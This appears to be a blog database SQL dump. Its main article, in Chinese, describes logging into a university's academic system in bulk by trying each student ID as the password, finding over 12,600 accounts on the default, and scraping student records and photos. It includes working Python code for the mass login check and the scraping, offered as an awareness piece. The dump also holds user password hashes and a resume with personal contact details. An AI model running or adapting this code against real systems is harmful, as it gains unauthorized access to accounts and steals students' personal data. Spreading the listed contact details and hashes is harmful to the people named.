class=\"pun\">)</span></code></li></ol></pre><p>至此，已经实现了所有信息的获取以及照片的保存。</p>\r\n<p>没改密码的同学们应该看到了，获取个人信息其实很简单，关键在于增强自己保护个人信息的意识。</p>\r\n</div>', '## 初衷\r\n**本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！**\r\n\r\n作者所在学校的教务系统安全防范措施可谓非常不严密，学生登录甚至不需要图形验证码。每年学生入学之后，学校下发的账号，初始密码不是无规律的，而是和账号完全一致！如果学生不及时修改密码，那么其他人可以轻松登录他的账号。登录后可以看到学生的学籍信息，包括高考报名时照片，家长联系方式等，联系地址甚至详细到几单元几楼几号门，**个人信息泄露情况非常严重！**\r\n\r\n## 结果\r\n先说结果。经过两天连写带调试，终于完成了对全校本科生 17400 多个在网账号的测试，其中有 12600 多个账号使用的还是初始密码。此处隐去校名，统计结果如下：\r\n\r\n| 序号 | 学院 | 年级 | 在网账号 | 可爬账号 | 年级占比 |\r\n| :-: | :-: | :-: | :-: | :-: | :-: |\r\n|1   |本一   |2014   |3157   |1998   |63.29%   |\r\n|2   |本一   |2015   |3328   |2234   |67.13%   |\r\n|3   |本一   |2016   |3641   |3066   |84.21%   |\r\n|4   |本一   |2017   |3497   |3326   |95.11%   |\r\n|5   |本三   |2014   |1759   |303   |17.23%   |\r\n|6   |本三    |2015   |1643   |620   |37.74%   |\r\n|7   |本三    |2016   |1605   |1434   |89.35%   |\r\n|8   |本三    |2017   |1552   |639   |41.17%   |\r\n\r\n**介于初衷，只爬了 10 个账号的信息，以示严重性！**\r\n\r\n![爬到的学籍信息](http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n## 过程\r\n本人之前做过近 2 年的 Java 相关开发，对 HTTP 协议中常用的知识了解一些，再加上 Python 出了名的简洁易用，因此入门还是比较轻松的。去年有一段时间研究过一阵子 Python，使用的是 Scrapy 框架，所以这一次我也首先想到了 Scrapy。\r\n\r\nScrapy 这种框架适用的情形是：已经获取了需要爬取的页面的一系列 URL ，或者 URL 是成一定规律变化的，不需要登录或者登录一次拿到 Cookie 就可以拿着这个 Cookie 一直用了。但是教务系统完全相反，它需要每次都进行登录，也许 Scrapy 有办法，但也不会太简单，索性自己写。\r\n\r\n这套教务系统虽然安全性不怎么样，但也已是一套成熟的产品了，功能和稳定性上还是很不错的。\r\n\r\n![系统的登录界面](http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n首先使用 Firefox 浏览器的开发者工具查看 HTTP 通信的一些信息：\r\n\r\n![登录请求 ( POST )](http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n登录表单通过 POST 请求进行提交，参数是账号和密码，发送的也是明文\r\n\r\n![表单参数](http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n服务器返回的响应中 Set-Cookie 就相当于给用户下发的令牌，用户下一次请求的时候带上这块令牌，服务器就能认出来这个用户是否刚登录过。这个令牌是有时间限制的，每次请求都会刷新一次时间，如果两次请求之间间隔时间超过设定值，那么服务器就不认识用户了，这次会话就结束了，需要重新登录。\r\n\r\n![登录的响应体](http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n刚开始使用的是 requests ，用 for 循环实现，由于 requests 是同步的，所以效率很低，还会经常卡死。后来改成了协程，用的 gevent + urllib3，效率提升了上百倍。解析 HTML 用的 lxml 的 etree，图片的保存用 PIL 的 Image。\r\n\r\n先引入依赖\r\n```\r\nimport sys\r\nimport logging\r\nimport gevent\r\nimport urllib3\r\nimport pathlib\r\nfrom PIL import Image\r\nfrom io import BytesIO\r\nfrom lxml import etree\r\n```\r\n创建 HTTP 连接池\r\n```\r\nhttp = urllib3.HTTPConnectionPool(\r\n	host=settings.SERVER_HOST,\r\n	port=settings.SERVER_PORT,\r\n	strict=False,\r\n	maxsize=100,\r\n	block=False,\r\n	retries=100,\r\n	timeout=10\r\n)\r\n```\r\n\r\n请求头的一些固定信息可以预先设定好，伪装浏览器\r\n```\r\nheader = {\'Accept\': \'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\',\r\n	\'Accept-Encoding\': \'gzip, deflate\',\r\n	\'Accept-Language\': \'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\',\r\n	\'Cache-Control\': \'max-age=0\',\r\n	\'Connection\': \'Keep-alive\',\r\n	\'Host\': settings.SERVER_HOST,\r\n	\'Upgrade-Insecure-Requests\': \'1\',\r\n	\'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\'\r\n}\r\n```\r\n登录并验证是否是初始密码\r\n```\r\n# 账号校验器\r\nclass InfoValidate(object):\r\n	def __init__(self):\r\n		self.logger = InfoMain.logger\r\n		self.http = InfoMain.http\r\n		# 有效账号\r\n		self.account_valid = []\r\n		# 可爬账号\r\n		self.account_available = []\r\n\r\n	def validate(self, all_account):\r\n		# 将所有校验过程加入队列\r\n		jobs = [gevent.spawn(self.validate_account, self.http, a) for a in all_account]\r\n		gevent.joinall(jobs, timeout=0)\r\n\r\n	def validate_account(self, http, account):\r\n		# 登录请求参数\r\n		param = {\"zjh\": account, \"mm\": account}\r\n		header = headers.header\r\n		response = http.request(\'POST\', settings.URL_LOGIN, fields=param, headers=header)\r\n		self.logger.info(\'发送请求>>{}\'.format(param))\r\n		self.logger.info(response.status)\r\n		# 响应体解码\r\n		res_text = response.data.decode(\'GB2312\', \'ignore\')\r\n\r\n		if res_text.find(\'密码不正确\') > -1:\r\n			# 密码有误\r\n			self.account_valid.append(account)\r\n		elif not res_text.find(\'证件号不存在\') > -1:\r\n			# 账号可爬\r\n			self.account_available.append(account)\r\n			self.account_valid.append(account)\r\n			self.logger.info(\"账号可用>>>{}\".format(account))\r\n```\r\n至此已经获取了所有初始密码未修改的账号了，下面研究一下，要爬取的学籍信息页的规律\r\n\r\n![学籍信息页](http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n\r\n![table 的结构](http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n一系列的信息都包裹在 ```<td width = \"275\"></td> ```之间，对应的 xpath 表达式即为 ```//td[starts-with(@width,\"275\")]/text()```\r\n\r\n基于之前对账号的测试，爬取学籍信息\r\n\r\n```\r\n# 信息收集器\r\nclass InfoCollect(object):\r\n	def __init__(self):\r\n		self.logger = InfoMain.logger\r\n		self.http = InfoMain.http\r\n		# 功能模块\r\n		self.mod_get_roll_info = settings.MOD_ROLL_INFO\r\n		self.mod_get_roll_img = settings.MOD_ROLL_IMG\r\n\r\n	def get_info_queue(self, accounts):\r\n		# 将所有信息收集过程加入队列\r\n		jobs = [gevent.spawn(self.get_info, a) for a in accounts]\r\n		gevent.joinall(jobs, timeout=0)\r\n\r\n	def get_info(self, stuid):\r\n		# 登录\r\n		param = {\'zjh\': stuid, \'mm\': stuid}\r\n		response = self.http.request(\'POST\', settings.URL_LOGIN, fields=param)\r\n		# 保存 Cookie\r\n		cookie = response.headers[\'Set-Cookie\'].replace(\'; path=/\', \'\')\r\n		header = headers.header\r\n		header[\'cookie\'] = cookie\r\n		# 学籍信息\r\n		if self.mod_get_roll_info:\r\n			# 带 Cookie 访问学籍信息页\r\n			response_xjxx = self.http.request(\'GET\', settings.URL_XJXX, headers=header)\r\n			text = response_xjxx.data.decode(\'GB2312\', \'ignore\')\r\n			# 解析页面内容\r\n			selector = etree.HTML(text)\r\n			text_arr = selector.xpath(\'//td[starts-with(@width,\"275\")]/text()\')\r\n			# 学籍信息\r\n			result = []\r\n			for info in text_arr:\r\n				result.append(info.strip())\r\n			self.save_info(result)\r\n		# 学籍照片\r\n		if self.mod_get_roll_img:\r\n			response_xjzp = self.http.request(\'GET\', settings.URL_XJZP, headers=header)\r\n			image = Image.open(BytesIO(response_xjzp.data))\r\n			setpath = settings.PATH_IMG_SAVE\r\n			path = pathlib.Path(setpath)\r\n			if not path.exists():\r\n				path.mkdir()\r\n			setpath = setpath + \'/\' + stuid + \'.jpg\'\r\n			image.save(setpath)\r\n			self.logger.info(\'保存照片>>>{}\'.format(setpath))\r\n\r\n		# 登出\r\n		self.http.request(\'POST\', settings.URL_LOGOUT, headers=header)\r\n```\r\n\r\n至此，已经实现了所有信息的获取以及照片的保存。\r\n\r\n没改密码的同学们应该看到了，获取个人信息其实很简单，关键在于增强自己保护个人信息的意识。', '2018-02-11 11:43:27', '2018-02-11 12:01:51');


-- ----------------------------
-- Records of tag
-- ----------------------------
INSERT INTO `tag` VALUES ('13', 'SpringBoot', '2017-12-09 15:26:30', '2017-12-09 15:26:30');
INSERT INTO `tag` VALUES ('14', 'MyBatis', '2017-12-09 15:26:31', '2017-12-09 15:26:31');
INSERT INTO `tag` VALUES ('15', 'MVC', '2017-12-09 15:26:31', '2017-12-09 15:26:31');
INSERT INTO `tag` VALUES ('16', 'AOP', '2017-12-09 15:26:31', '2017-12-09 15:26:31');
INSERT INTO `tag` VALUES ('17', 'Servlet', '2017-12-09 23:51:56', '2017-12-16 15:42:45');


-- ----------------------------
-- Records of tag_article
-- ----------------------------
INSERT INTO `tag_article` VALUES ('2', '13', '24', '2017-12-09 15:26:31', '2017-12-09 15:26:31');
INSERT INTO `tag_article` VALUES ('3', '14', '24', '2017-12-09 15:26:31', '2017-12-09 15:26:31');
INSERT INTO `tag_article` VALUES ('4', '15', '24', '2017-12-09 15:26:31', '2017-12-09 15:26:31');
INSERT INTO `tag_article` VALUES ('5', '16', '24', '2017-12-09 15:26:31', '2017-12-09 15:26:31');
INSERT INTO `tag_article` VALUES ('6', '17', '24', '2017-12-09 23:52:12', '2017-12-09 23:52:12');
INSERT INTO `tag_article` VALUES ('7', '17', '23', '2017-12-09 23:54:21', '2017-12-09 23:54:21');
INSERT INTO `tag_article` VALUES ('8', '13', '22', '2017-12-09 23:58:14', '2017-12-16 15:43:34');


-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES ('23', 'ZBL', '4d8812dbb1bc41c2d4af4a9967bff7a7', null, 'ZBL', null, null, null, null, null, null, null, null, '0', '0', '2017-12-06 18:48:37', '2017-12-08 23:54:00');
INSERT INTO `user` VALUES ('25', '18333298410', '5b3ea3a80775c95c608cd3c220f2a754', null, '18333298410', null, null, null, null, null, null, null, null, '0', '0', '2017-12-09 00:06:36', '2017-12-16 15:43:53');


-- ----------------------------
-- Records of resume
-- ----------------------------
INSERT INTO `resume` VALUES ('1', '开发者', '开发者简历', '<div class=\"markdown-body editormd-preview-container\" previewcontainer=\"true\" style=\"padding: 20px;\"><h1 id=\"h1-i-m-james\"><a name=\"I’m James\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>I’m James</h1><h2 id=\"h2-u8054u7CFBu65B9u5F0F\"><a name=\"联系方式\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>联系方式</h2><ul>\r\n<li>Email：<a href=\"mailto:zhengbaole_1996@163.com\">zhengbaole_1996@163.com</a></li><li>QQ：1146556298</li><li>微信：zbl19961120</li></ul>\r\n<h2 id=\"h2-u4E2Au4EBAu4FE1u606F\"><a name=\"个人信息\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>个人信息</h2><ul>\r\n<li>郑保乐/男/1996.11</li><li>本科/河北科技大学理工学院/软件工程</li><li>工作年限：2019届实习生</li><li>Github：<a href=\"http://github.com/jameszbl\">http://github.com/jameszbl</a></li><li>技术博客：<a href=\"http://jameszbl.github.io\">http://jameszbl.github.io</a></li><li>期望职位：Java 后端开发</li><li>期望薪资：税前月薪 7k-8k</li><li>期望城市：石家庄</li></ul>\r\n<h2 id=\"h2-u9879u76EEu7ECFu5386\"><a name=\"项目经历\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>项目经历</h2><h3 id=\"h3-u5DE5u7A0Bu8D28u91CFu5BA1u6838u5E73u53F0\"><a name=\"工程质量审核平台\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>工程质量审核平台</h3><p>这是一个装饰企业内部项目，用于工程实施现场照片的归档、上级部门的审核、意见反馈等功能，后端采用 SSM 架构、MySQL 数据库。我在此项目负责后端图片归档模块、上级部门审核反馈模块以及移动端的资料上传模块的开发。移动端因兼容性而无法正常选择文件，最终以 Retrofit 异步上传代替传统的表单提交。后端实现了工程资料暂存、前端实现了等待 WIFI 统一上传文件的功能。</p>\r\n<h2 id=\"h2-u5F00u6E90u9879u76EEu548Cu4F5Cu54C1\"><a name=\"开源项目和作品\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>开源项目和作品</h2><h3 id=\"h3-u5F00u6E90u9879u76EE\"><a name=\"开源项目\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>开源项目</h3><ul>\r\n<li><a href=\"[url_github_fsblog]\">FS-Blog</a>：基于 Spring Boot 的个人博客</li><li><a href=\"[url_github_zhilian_spider]\">Zhilian Spider</a>：智联招聘关键词搜索职位信息爬虫</li></ul>\r\n<h3 id=\"h3-u6280u672Fu6587u7AE0\"><a name=\"技术文章\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>技术文章</h3><ul>\r\n<li><a href=\"http://jameszbl.github.io/2017/01/01/SpringMVC-%E4%B9%8B-DispatcherServlet/\">Spring MVC 解析之 DispatcherServlet</a></li><li><a href=\"http://jameszbl.github.io/2017/11/29/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B-Singleton/\">Java 单例模式几种实现方式</a></li></ul>\r\n<h2 id=\"h2-u6280u80FDu6E05u5355\"><a name=\"技能清单\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>技能清单</h2><ul>\r\n<li>后端开发：Spring/SpringBoot/MyBatis/Freemarker</li><li>Web框架：Spring MVC/Spring WebFlux</li><li>前端框架：Vue.js/jQuery/Bootstrap/EasyUI</li><li>数据库相关：MySQL/MSSQL/Redis</li><li>版本管理、文档和自动化部署工具：Git/SVN/Docker/Travis</li><li>日志相关：Log4j/Slf4j</li><li>单元测试：JUnit</li><li>操作系统：Windows/Linux</li><li>服务器:Tomcat/Nginx/Apache</li><li>构建、依赖管理工具：Maven/Gradle</li></ul>\r\n<h2 id=\"h2-u5176u4ED6u7ECFu5386\"><a name=\"其他经历\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>其他经历</h2><ul>\r\n<li>阅读过 Spring、Google Gson 的部分源码</li><li>华北五省及港澳台计算机应用大赛 二等奖</li></ul>\r\n</div>', '# I\'m James\r\n\r\n## 联系方式\r\n- Email：zhengbaole_1996@163.com\r\n- QQ：1146556298\r\n- 微信：zbl19961120\r\n\r\n## 个人信息\r\n- 郑保乐/男/1996.11\r\n- 本科/河北科技大学理工学院/软件工程\r\n- 工作年限：2019届实习生\r\n- Github：[http://github.com/jameszbl][url_github_home]\r\n- 技术博客：[http://jameszbl.github.io][url_github_page]\r\n- 期望职位：Java 后端开发\r\n- 期望薪资：税前月薪 7k-8k\r\n- 期望城市：石家庄\r\n\r\n## 项目经历\r\n### 工程质量审核平台\r\n这是一个装饰企业内部项目，用于工程实施现场照片的归档、上级部门的审核、意见反馈等功能，后端采用 SSM 架构、MySQL 数据库。我在此项目负责后端图片归档模块、上级部门审核反馈模块以及移动端的资料上传模块的开发。移动端因兼容性而无法正常选择文件，最终以 Retrofit 异步上传代替传统的表单提交。后端实现了工程资料暂存、前端实现了等待 WIFI 统一上传文件的功能。\r\n\r\n## 开源项目和作品\r\n### 开源项目\r\n- [FS-Blog]([url_github_fsblog])：基于 Spring Boot 的个人博客\r\n- [Zhilian Spider]([url_github_zhilian_spider])：智联招聘关键词搜索职位信息爬虫\r\n\r\n### 技术文章\r\n- [Spring MVC 解析之 DispatcherServlet][url_spring_mvc]\r\n- [Java 单例模式几种实现方式][url_singleton]\r\n\r\n## 技能清单\r\n- 后端开发：Spring/SpringBoot/MyBatis/Freemarker\r\n- Web框架：Spring MVC/Spring WebFlux\r\n- 前端框架：Vue.js/jQuery/Bootstrap/EasyUI\r\n- 数据库相关：MySQL/MSSQL/Redis\r\n- 版本管理、文档和自动化部署工具：Git/SVN/Docker/Travis\r\n- 日志相关：Log4j/Slf4j\r\n- 单元测试：JUnit\r\n- 操作系统：Windows/Linux\r\n- 服务器:Tomcat/Nginx/Apache\r\n- 构建、依赖管理工具：Maven/Gradle\r\n\r\n## 其他经历\r\n- 阅读过 Spring、Google Gson 的部分源码\r\n- 华北五省及港澳台计算机应用大赛 二等奖\r\n\r\n[url_github_fsblog]: http://github.com/jameszbl/fs-blog\r\n[url_github_home]: http://github.com/jameszbl\r\n[url_github_page]: http://jameszbl.github.io\r\n[url_singleton]: http://jameszbl.github.io/2017/11/29/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B-Singleton/\r\n[url_spring_mvc]: http://jameszbl.github.io/2017/01/01/SpringMVC-%E4%B9%8B-DispatcherServlet/\r\n[url_github_zhilian_spider]:https://github.com/JamesZBL/zhilian_spider', '2018-03-28 16:38:58', '2018-03-28 17:57:47');